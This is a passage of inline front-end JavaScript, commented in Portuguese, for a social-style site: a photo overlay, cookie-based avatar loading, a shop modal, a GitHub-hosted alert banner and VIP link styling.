  const fullscreenImage = document.getElementById('fullscreen-user-photo-amigos');

  listaAmigos.addEventListener('dblclick', (event) => {
    const target = event.target;
    // Verifica se clicou na imagem com a classe correta
    if (target && target.classList.contains('friend-photo-item')) {
      // Atualiza o src da imagem fullscreen
      fullscreenImage.src = target.src;
      // Exibe o overlay com flex para centralizar
      fullscreenOverlay.style.display = 'flex';
    }
  });

  // Fecha o overlay ao clicar fora da imagem
  fullscreenOverlay.addEventListener('click', (event) => {
    if (event.target === fullscreenOverlay) {
      fullscreenOverlay.style.display = 'none';
      fullscreenImage.src = '';
    }
  });
});




function getCookie(name) {
    let cookieArr = document.cookie.split(";");
    for (let i = 0; i < cookieArr.length; i++) {
        let cookiePair = cookieArr[i].split("=");
        if (name === cookiePair[0].trim()) {
            const decodedValue = decodeURIComponent(cookiePair[1]);
            return atob(decodedValue); 
        }
    }
    return null;
}

setTimeout(() => {
  const userId = getCookie('id');
  const userImage = document.getElementById('id');
  const defaultSrc = 'opa';

  if (!userImage) return;

  if (userId) {
    const customSrc = `../../icons/${userId}.png`;

    const checkImage = (src, callback) => {
      const img = new Image();
      img.onload = () => callback(true);
      img.onerror = () => callback(false);
      img.src = src;
    };

    checkImage(customSrc, (exists) => {
      userImage.src = exists ? customSrc : defaultSrc;
    });
  } else {
    userImage.src = defaultSrc;
  }
}, 50);

const openBtn = document.getElementById('openGuiBtn');
const closeBtn = document.getElementById('closeGuiBtn');
const modal = document.getElementById('modalGui');
const modalBg = document.getElementById('modalBackground');
const iframe = document.getElementById('guiIframe');
const loadingScreen = document.getElementById('loadingScreen');
const loadingText = document.getElementById('loadingText');

function openModal() {
  loadingText.textContent = 'Conectando à LOJA...';
  loadingScreen.classList.add('active');
  iframe.style.display = 'none';

  modal.classList.add('active');
  modalBg.classList.add('active');

  modal.style.display = 'flex';
  modalBg.style.display = 'block';

  setTimeout(() => {
    iframe.src = '../compras/shop.html';
  }, 2500);

  iframe.onload = () => {
    loadingScreen.classList.remove('active');
    iframe.style.display = 'block';
  };
}

function closeModal() {
  modal.classList.remove('active');
  modalBg.classList.remove('active');
  iframe.src = '';
  iframe.style.display = 'none';
  loadingScreen.classList.remove('active');

  setTimeout(() => {
    modal.style.display = 'none';
    modalBg.style.display = 'none';
  }, 400); 
}


function closeModal() {
  modal.classList.remove('active');
  modalBg.classList.remove('active');
  iframe.src = '';
  iframe.style.display = 'none';
  loadingScreen.classList.remove('active');
  window.location.reload();
}


openBtn.addEventListener('click', openModal);
closeBtn.addEventListener('click', closeModal);
modalBg.addEventListener('click', closeModal);



//                  2F                  //
let defaultSrc2 = defaultSrc;

function getCookie(name) {
    let cookieArr = document.cookie.split(";");
    for (let i = 0; i < cookieArr.length; i++) {
        let cookiePair = cookieArr[i].split("=");
        if (name === cookiePair[0].trim()) {
            const decodedValue = decodeURIComponent(cookiePair[1]);
            return atob(decodedValue);
        }
    }
    return null;
}
const alertAPI_openBtn = document.getElementById('alertAPI_openBtn');
const alertAPI_overlay = document.getElementById('alertAPI_overlay');
const alertAPI_closeBtn = document.getElementById('alertAPI_closeBtn');
const alertAPI_img = document.getElementById('alertAPI_img');

function alertAPI_openOverlay(url) {
    alertAPI_img.src = url;
    alertAPI_overlay.classList.add('alertAPI_active');
    alertAPI_overlay.setAttribute('aria-hidden', 'false');
    document.body.classList.add('alertAPI_noScroll');
    alertAPI_closeBtn.focus();
}

function alertAPI_closeOverlay() {
    alertAPI_overlay.classList.remove('alertAPI_active');
    alertAPI_overlay.setAttribute('aria-hidden', 'true');
    document.body.classList.remove('alertAPI_noScroll');
    alertAPI_openBtn.focus();
}

alertAPI_openBtn.addEventListener('click', () => {
    alertAPI_openOverlay('https://images.unsplash.com/photo-1519681393784-d120267933ba?auto=format&fit=crop&w=1200&q=80');
});

alertAPI_closeBtn.addEventListener('click', alertAPI_closeOverlay);
alertAPI_overlay.addEventListener('click', (e) => { 
    if (e.target === alertAPI_overlay) alertAPI_closeOverlay(); 
});
document.addEventListener('keydown', (e) => { 
    if (e.key === 'Escape' && alertAPI_overlay.classList.contains('alertAPI_active')) alertAPI_closeOverlay(); 
});

window.addEventListener('DOMContentLoaded', async () => {
    const url = 'https://api.github.com/repos/ghosthszz/inf/contents/API.json';

    try {
        const response = await fetch(url, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Accept': 'application/vnd.github+json'
            }
        });

        if (!response.ok) throw new Error(`Erro ${response.status}`);

        const dataJson = await response.json();
        const jsonString = atob(dataJson.content);
        const dataArray = JSON.parse(jsonString);

        // procura pelo objeto ALERT dentro do array
        const alertObj = dataArray.find(item => item.API === 'ALERT');

        if (alertObj && alertObj.STATUS === 'ONLINE' && alertObj.URL && alertObj.DATA) {
            const hoje = new Date();
            const dataAPI = new Date(alertObj.DATA); // exemplo: "2025-09-28T01:55"

            if (dataAPI < hoje) {
            } else {
                alertAPI_openOverlay(alertObj.URL);
            }
        }
    } catch (error) {
        console.error('Bad request: 400');
    }
});





function reescreverLink(originalHTML, isVip) {
  // Criar um container temporário para manipular o HTML original
  const container = document.createElement('div');
  container.innerHTML = originalHTML.trim();

  // Pega o <a> dentro do li (supondo que o original tem um <li><a>...</a></li>)
  const aOrig = container.querySelector('a');
  if (!aOrig) return originalHTML; // se não encontrar o <a>, retorna original

  // Extrai infos importantes do link original
  const href = aOrig.getAttribute('href');
  const target = aOrig.getAttribute('target') || '_blank';

  // Pega a imagem original
  const img = aOrig.querySelector('img');
  const imgSrc = img ? img.getAttribute('src') : '';
  const imgAlt = img ? img.getAttribute('alt') : '';

  // Pega os textos dentro dos spans (nome e arquivos)
  const spanNome = aOrig.querySelector('.user-name');
  const spanArquivos = aOrig.querySelector('.user-rating');

  const nome = spanNome ? spanNome.textContent : '';
  const arquivos = spanArquivos ? spanArquivos.textContent : '';

  // Cria o novo <a> com os estilos
  const novoA = document.createElement('a');
  novoA.href = href;
  novoA.target = target;
  novoA.style.display = 'flex';
  novoA.style.alignItems = 'center';
  novoA.style.justifyContent = 'space-between';
  novoA.style.textDecoration = 'none';

  // Cria a img estilizada
  const novaImg = document.createElement('img');
  novaImg.id = 'lk';
  novaImg.src = imgSrc;
  novaImg.alt = imgAlt;
  novaImg.style.maxHeight = '100px';
  novaImg.style.marginRight = '10px';

  // Div do texto (nome e arquivos)
  const divTextos = document.createElement('div');
  divTextos.style.display = 'flex';
  divTextos.style.flexDirection = 'column';
  divTextos.style.flexGrow = '1';
  divTextos.style.lineHeight = '1.2';

  const spanNomeNovo = document.createElement('span');
  spanNomeNovo.style.fontWeight = 'bold';
  spanNomeNovo.style.color = 'inherit';
  spanNomeNovo.textContent = nome;

  const spanArquivosNovo = document.createElement('span');
  spanArquivosNovo.style.color = 'white';
  spanArquivosNovo.textContent = arquivos;

  divTextos.appendChild(spanNomeNovo);
  divTextos.appendChild(spanArquivosNovo);

  novoA.appendChild(novaImg);
  novoA.appendChild(divTextos);

  // Se for VIP, adiciona o badge VIP
  if (isVip) {
    const vipSpan = document.createElement('span');
    vipSpan.style.color = 'red';
    vipSpan.style.fontWeight = 'bold';
    vipSpan.style.marginLeft = '10px';
    vipSpan.textContent = 'VIP';
    novoA.appendChild(vipSpan);
  }

  return novoA.outerHTML;
}

window.onload = showImageOnLoad;
  limparPrefixoDoPassaporte();
  carregarLinksUsuario(user.id_links, user.id_vips);

</script> 
</body>
</html>
